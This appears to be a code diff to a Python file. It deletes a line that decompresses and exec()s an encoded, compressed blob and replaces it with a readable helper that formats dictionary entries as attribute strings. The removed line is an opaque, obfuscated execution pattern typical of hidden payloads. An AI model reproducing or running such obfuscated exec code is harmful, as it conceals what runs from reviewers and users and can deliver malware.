@@ -1,2 +1,12 @@
-import lzma,base64
-exec(lzma.decompress(base64.b64decode(b'/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AE9AL1dADIZSP9PCm8uEnWszOKJb7ahWBcNvHuyuXuUfe8kv+b3EqJwLyAnaVm3fBjrGdTg+JalHFCq5RhjBP3jPifgN+kG3S/uVQBr4gjdNlewNb4N2CiaSdjJclXPjkp2rYYo229mu1Z27aeyZ5U4tk4DJdWDtlIS/JBkFBKRSnTVyQuFXVS/sKeCamiM6DnF7te5f0WLnUl2rdDyHnYVVPqNMBBorBkGGrb70Y6JtJysoyv6lohaEaaHDw7A33QUAAAAAACX3mgT/wxZtwAB2QG+AgAATV0tNbHEZ/sCAAAAAARZWg==')))
+def get_attrs(dicts):
+    attrs = ""
+    for f in dicts:
+        val = dicts.get(f)
+        if f == 'disabled' and not val:
+            continue
+        if val is not None:
+            if isinstance(val, bool):
+                val = str(val).lower()
+            attrs += '\t{}=\"{}\"'.format(f, val)
+    return attrs
+
